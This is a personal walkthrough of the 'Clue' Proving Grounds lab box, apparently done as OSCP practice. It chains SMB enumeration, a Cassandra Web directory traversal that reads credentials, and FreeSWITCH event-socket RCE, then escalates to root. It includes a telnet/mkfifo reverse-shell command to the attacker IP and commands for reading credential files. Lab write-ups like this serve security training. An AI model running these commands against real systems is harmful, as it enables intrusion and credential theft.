---
date: 2025-10-25
title: Clue
---
Difficulty: Hard
# System Information
IP: 192.168.104.240
OS: Linux

Attacking IP on tun0: 192.168.45.212

# Service Discovery
`nmap --min-rate 4500 --max-rtt-timeout 1500ms -p- -Pn 192.168.104.240 -oG nmap/all_ports.gnmap`

Start manual enumeration while autorecon runs:
`autorecon 192.168.104.240 --only-scans-dir`
## Open Ports & Priority
TCP Ports:
- [x] [[#80 - HTTP]]
- [x] [[#8021]]
- [x] [[#139/445 - SAMBA]]
- [x] [[#3000 Cassandra Web]]
- [ ] 22

# Service Enumeration
## 80 - HTTP
![[Pasted image 20251025155845.png]]

I'll brute force directories to hopefully discover content that we're able to access.
`ffuf -u http://192.168.104.240/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 404 -t 50`

```
backup                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 102ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 96ms]
```
- No useful findings

## 8021
- Unable to use anonymous auth to connect
- Using nc to try banner grabbing, it just prints "Content-Type: auth/request". 
	- After timing out, it prints the following message: "Disconnected, goodbye. See you at ClueCon! http://www.cluecon.com/" 
	- This seems to be a real conference hosted by the team behind FreeSWITCH, a FOSS project. Apparently it "powers some of the world's largest telephony infrastructures." Never heard of it before, but pretty cool!! https://signalwire.com/freeswitch

## 139/445 - SAMBA

NetBIOS/SMB (SAMBA) on Linux is unusual, and would be more expected in an AD domain.

Autorecon quickly found that anonymous auth is allowed, and gives read/write access to a few shares, including one named backup.
- `nmap --privileged -vv --reason -Pn -T4 -sV -p 139 "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN /home/kali/oscp/clue/results/192.168.104.240/scans/tcp139/tcp_139_smb_nmap.txt -oX /home/kali/oscp/clue/results/192.168.104.240/scans/tcp139/xml/tcp_139_smb_nmap.xml 192.168.104.240`

![[Pasted image 20251025162633.png]]

I'm seeing more references to the aforementioned FreeSWITCH project, in the \backup share. 

I'll download the entire contents to search better on my system in VScode
`smbclient //$IP/backup -N -c "prompt OFF; recurse ON; mget *"`

It downloads two folders, freeswitch and cassandra (backend database).

Interesting findings:
- freeswitch/etc/freeswitch/vars.xml
	- `<X-PRE-PROCESS cmd="set" data="default_password=1234"/>`
- freeswitch/etc/freeswitch/autoload_configs/hash.conf.xml
	- `	<!-- <remote name="Test1" host="10.0.0.10" port="8021" password="ClueCon" interval="1000" /> -->`
- freeswitch/etc/freeswitch/autoload_configs/event_socket.conf.xml
	- `<param name="listen-port" value="8021"/>`
	- `<param name="password" value="ClueCon"/>`
	
The config files in this backup look untouched, and contain many default passwords.

However, when trying to use authenticated RCE exploits such as https://www.exploit-db.com/exploits/47698 and https://www.exploit-db.com/exploits/47799, they fail to authenticate. At this point I was quite stuck, as I wasn't sure how I would find valid credentials.

### 3000 Cassandra Web

According to https://www.exploit-db.com/exploits/49362, Cassandra Web 0.5.0 contains a vulnerability allowing for directory traversal.

Sure enough, I'm able to read /etc/passwd using this exploit, as well as `python3 cassandra.py 192.168.104.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml`, which was blocking my progress in [[139,445 SMB]].

The event socket password is StrongClueConEight021 (thankfully I didn't try to brute force this).

![[Pasted image 20251025174801.png]]

The exploit also shows an example to get the password belonging to the user running Cassandra Web: `/proc/self/cmdline`. It yields `/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330`

# Initial Access

Download https://www.exploit-db.com/exploits/47799. To confirm command execution first, can we use the server to make a simple HTTP request to a server we control?

`python3 -m http.server 80`

`python3 47799.py 192.168.104.240 'curl 192.168.45.212'`

![[Pasted image 20251025175724.png]]

The request reaches my server, meaning I can execute code on the server and reach back to my attacking machine's IP. 

Start a netcat listener on attacking kali machine:
`rlwrap -lnvp 4440`

After many attempts using the various shells from revshells.com, I was able to establish a reverse shell with the telnet payload, interestingly.

`python3 47799.py 192.168.104.240 'TF=$(mktemp -u);mkfifo $TF && telnet 192.168.45.212 80 0<$TF | sh 1>$TF'`
# Privilege Escalation

Upgrade shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

`whoami`
We have access as the "freeswitch" user.

The password from earlier, StrongClueConEight021, is not the user's system password, so we can't check our sudo rights.

![[Pasted image 20251025181715.png]]

After some additional enumeration, I decided to switch to the cassie user, whose password we discovered earlier from the directory traversal exploit, https://www.exploit-db.com/exploits/49362.

`su cassie`

![[Pasted image 20251025190107.png]]


`sudo -l` reveals that cassie can run /usr/local/bin/cassandra-web as root without a password.

It's not already running as root, is it? Nope. I returned to the script from earlier, but found I was unable to read /etc/shadow.

Oh, there's a private key in /home/cassie? That's an unusual spot. I didn't see this earlier. 

I'm able to use it to ssh as root!
`ssh root@localhost -i id_rsa`

![[Pasted image 20251025191410.png]]

`find / -type f -name local.txt -or -name proof.txt -exec cat {} 2>/dev/null`
- /var/lib/freeswitch/local.txt
	- e3a6f8f902ea1b4c5063374bf5c9d00a
- /root/proof.txt
	- The proof is in another file

It looks like there's still work to do for the root flag?... That's a first.

After checking some other writeups for this lab online, I realized that it was hinting to run cassandra-web as root using cassie's sudoer permission, then use the directory traversal exploit from earlier once again to read the entire filesystem as root, and find a way to gain a shell from there. 

This would make more sense if root's SSH key wasn't already in cassie's home directory. I'm not sure I would have thought to do this after already having root.

Sure enough, after running cassandra-web as root, a new flag appeared, /root/proof_youtriedharder.txt.
`sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:1337 -u cassie -p SecondBiteTheApple330`

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20251025204834.png]]


# Reflection
This was a pretty challenging box. At a few points I had to take a step back and re-examine points where I made assumptions. For example, when I found the backup share, I totally assumed the credentials it contained would be valid. I thought, why would it be there if they couldn't be used at all?? 

I'm also learning that while the lab description on Proving Grounds can be useful for context and what to expect, it sometimes caused me to focus too much on the known, and ignore other important aspects. For instance, the description states that there is a command execution vulnerability in Freeswitch Event Socket, but doesn't mention the vulnerable Cassandra instance! This was a massively important part of this lab, as without it, we couldn't have found the correct event socket password, password for cassie, or the final root flag!
